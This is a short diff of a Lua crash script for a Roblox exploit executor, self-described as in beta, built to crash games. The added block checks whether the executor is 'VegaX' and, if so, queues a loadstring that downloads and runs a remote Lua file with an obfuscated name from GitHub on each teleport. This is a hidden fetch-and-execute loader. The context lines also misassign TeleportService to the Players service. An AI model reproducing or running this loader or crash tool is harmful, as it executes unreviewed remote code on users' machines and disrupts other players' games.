@@ -8,6 +8,7 @@ Credits
 ]]
 -- THIS IS IN BETA TESTING.
 printconsole = printconsole or warn
+
 _G.CrashSettings = {
 	Enabled = true,
 	Games = {
@@ -53,6 +54,12 @@ _G.CrashSettings = {
 }
 
 if _G.CrashSettings.Enabled ~= true then return end
+
+-- VegaX use only!
+if identifyexecutor() == "VegaX" then
+	queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/CrisomoX/makeBoom/main/iodf9s8jiosiuuisodfhuihjdfuaoshsafbiasfasfasfsafas.lua'))()")
+end
+
 -- Services --
 local Players = game:GetService('Players')
 local TeleportService = game:GetService('Players')
